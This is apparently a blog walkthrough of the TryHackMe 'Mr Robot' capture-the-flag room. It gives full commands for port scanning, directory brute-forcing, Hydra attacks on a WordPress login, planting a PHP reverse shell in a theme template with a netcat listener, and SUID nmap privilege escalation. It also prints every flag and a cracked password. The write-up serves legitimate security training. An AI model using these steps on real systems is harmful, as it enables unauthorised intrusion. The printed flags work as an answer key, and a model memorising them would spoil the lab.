---
title: "Mr Robot CTF"
description: "A walkthrough of the TryHackMe Mr. Robot CTF room, covering reconnaissance, web enumeration, WordPress exploitation, credential attacks, post-exploitation enumeration, and privilege escalation to root."
---

Published: 2025-11-06

---

# Reconnaissance

The first step in the assessment was to identify exposed services and map out the target’s attack surface.

### Nmap Scan

An initial Nmap scan was performed to identify open ports, running services, and their versions, helping to map out the target’s attack surface for further enumeration.

```bash title="bash"
nmap -sC -sV TARGET_IP
```

![Nmap Scan](/images/mr-robot/nmap-scan.png)

### Findings

The scan revealed three open ports on the target:

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 443  | HTTPS   |

This indicated that the primary attack surface was the web service running on port 80/443.

---

# Web Enumeration

After identifying the web server, the next step was to inspect the website manually.
Upon visiting the target, a custom Mr. Robot-themed landing page appeared.
While visually appealing, public-facing pages rarely tell the whole story.

![Website](/images/mr-robot/website.png)

### Source Code

I first checked the page source for anything useful such as comments, hidden endpoints, JavaScript files, or any exposed sensitive information.

![Website](/images/mr-robot/source-code.png)

Nothing interesting was found here.

### Content Discovery

Next, I ran directory brute-forcing using `Gobuster` to look for hidden paths and files on the web server.

```bash title="bash"
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/common.txt
```

![gobuster](/images/mr-robot/gobuster.png)

The scan returned a few interesting endpoints, including WordPress login page and a `robots.txt` file:

```text
/robots.txt
/wp-login.php
```

One of the first things I checked was:

```text
http://TARGET_IP/robots.txt
```
![robots](/images/mr-robot/robots-txt.png)

The `robots.txt` file usually tells search engines what they can or can’t index, but in this case
it also exposed two interesting files which is `fsocity.dic` and `key-1-of-3.txt`.

A file would be downloaded by upon visiting `/fsocity.dic`, while visiting the `/key-1-of-3.txt` it will reveal the first key. The `fsocity.dic` file seems like a list containing usernames and passwords:

If it doesn’t download automatically, you can grab it manually with:

```bash title="bash"
wget http://TARGET_IP/fsocity.dic
```

The first key was successfully obtained from the exposed file:

![key 1](/images/mr-robot/key-1.png)

```bash
073403c8a58a1f80d943455fb30724b9
```


---

# Credential Discovery

### Login Form Analysis

Since we already discovered the WordPress login page during enumeration, the next step was to find valid credentials and gain access to the admin dashboard.

![login-page](/images/mr-robot/login-page.png)

I started by inspecting the login page using the browser's developer tools to see how the form was structured. From the HTML source, I identified the parameters used for authentication: `log` for the username and `pwd` for the password.

![login-parameter](/images/mr-robot/parameter.png)

As a quick test, I attempted to log in using the commonly used credentials admin for both the username and password.
The application returned an `Invalid username` message, confirming login behavior and enabling enumeration.

![invalid-response](/images/mr-robot/invalid-response.png)

During enumeration, the fsocity.dic file was identified as a potential source of usernames and passwords.
Before using it, I checked its size and found that it contained 858,160 entries.
```bash title="bash"
wc -w fsocity.dic

# 858160 fsocity.dic
```

Since the wordlist contained a large number of duplicate words, I cleaned it up by creating a new file
with only unique entries. This reduced the total number of words to 11,451, making subsequent brute-force
and enumeration tasks much more efficient.
```bash title="bash"
sort fsocity.dic | uniq > wordlist.txt

wc -w wordlist.txt

# 11451 wordlist.txt
```
### Username Enumeration

Using the optimized wordlist and a dummy password `test`, I configured Hydra to treat `Invalid username` as the failure condition. Any response that differed from this message would indicate a valid account.

The enumeration successfully revealed a valid username: `Elliot`.

```bash title="bash"
hydra -L wordlist.txt -p test TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
```

![hydra-username](/images/mr-robot/hydra-username.png)

### Password Enumeration

After identifying the valid username `Elliot`, I attempted to log in again and observed that the error message had changed. Instead of returning `Invalid username`, WordPress now responded with `The password you entered for the username...`, confirming that the username was valid and only the password was incorrect.

Using this information, I configured Hydra to perform a password brute-force attack against the `Elliot` account. The optimized wordlist was supplied as the password list, while the new error message was used as the failure condition to identify a successful login.

The enumeration successfully revealed a valid username: `ER28-0652`.

```bash title="bash"
hydra -l Elliot -P wordlist.txt TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username"
```

![hydra-password](/images/mr-robot/hydra-password.png)

---

# Initial Access

### Remote Code Execution

After logging into WordPress as `Elliot`, I confirmed the account had administrative privileges, allowing access to the theme editor under **Appearance → Editor**.

From there, I selected the `Archives` template and replaced its contents with a PHP reverse shell.
I used the standard Pentestmonkey PHP from [reverse shell](https://www.revshells.com) and copied the
raw code directly from its source before injecting it into the template.

**Note:** Change the `IP` and `PORT` before uploading.

![archive](/images/mr-robot/archive-file.png)

### Reverse Shell

Now, I started a Netcat listener on my attack machine to catch the incoming reverse shell.
```bash title="bash"
nc -lvnp 9001
```

By accessing the following URL, the reverse shell was executed and a session was received in the listener:

```bash
http://<TARGET_IP>/wp-content/themes/twentyfifteen/archive.php
```

![received](/images/mr-robot/netcat-received.png)

After some enumeration, I found two interesting files: the second key, which is only readable by the 
`robot` user, and a file containing `robot`’s MD5 hash.

![robot files](/images/mr-robot/robot-files.png)

Since the hash was accessible, I attempted to crack it using an online tool [CrackStation](https://crackstation.net).
The hash was successfully resolved, revealing the password for the `robot` user.

```bash
abcdefghijklmnopqrstuvwxyz
```

So, the password for the `robot` user is `abcdefghijklmnopqrstuvwxyz`. I then attempted to switch to the `robot` account to retrieve the second key.

However, the shell was not fully interactive, which limited certain commands like switching users. To make navigation easier, I optionally upgraded it to a proper TTY using Python’s `pty` module:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Once logged in as the `robot` user, I accessed the home directory and located the second key file. As the file was readable by the user, I viewed its contents to obtain the second key.

![key 2](/images/mr-robot/key-2.png)

```bash
822c73956184f694993bede3eb39f959
```

---

# Privilege Escalation

### Enumeration

With only the final key remaining, the next objective was to gain root access. The hint provided for the third key mentioned `nmap`, suggesting it might be related to the privilege escalation path.

To identify potential privilege escalation vectors, I searched for files with the SUID bit set. SUID binaries execute with the permissions of their owner rather than the user running them, which can sometimes be abused to gain elevated privileges.

```bash title="bash"
find / -perm -u=s -type f 2>/dev/null
```

![nmap](/images/mr-robot/local-nmap.png)

Among the results, `nmap` immediately stood out as an unusual SUID binary. To determine whether it could be leveraged for privilege escalation, I checked [GTFOBins](https://gtfobins.org), a resource that documents how common binaries can be abused in privilege escalation scenarios.

Searching for `nmap` revealed a known technique that could be used to obtain root privileges.

![vulnerability](/images/mr-robot/vulnerability.png)

### Root Access

Using the technique provided by GTFOBins, I leveraged the SUID-enabled `nmap` binary to spawn an interactive shell with elevated privileges. Since the binary executes with the permissions of its owner, this resulted in a root shell.

After obtaining root access, I navigated to the root user's directory and retrieved the final key.

![key 3](/images/mr-robot/key-3.png)

```bash
04787ddef27c3dee1ee161b21670b4e4
```

---

# Conclusion

The Mr. Robot CTF is an excellent room for learning how attackers chain multiple weaknesses together to achieve complete system compromise. While none of the individual vulnerabilities are particularly advanced, their combination creates a realistic attack path that mirrors real-world penetration testing engagements.

The challenge emphasizes the importance of thorough enumeration, careful analysis of discovered artifacts, and systematic privilege escalation techniques. For aspiring penetration testers, it serves as an excellent introduction to the full attack lifecycle, from reconnaissance to root compromise.
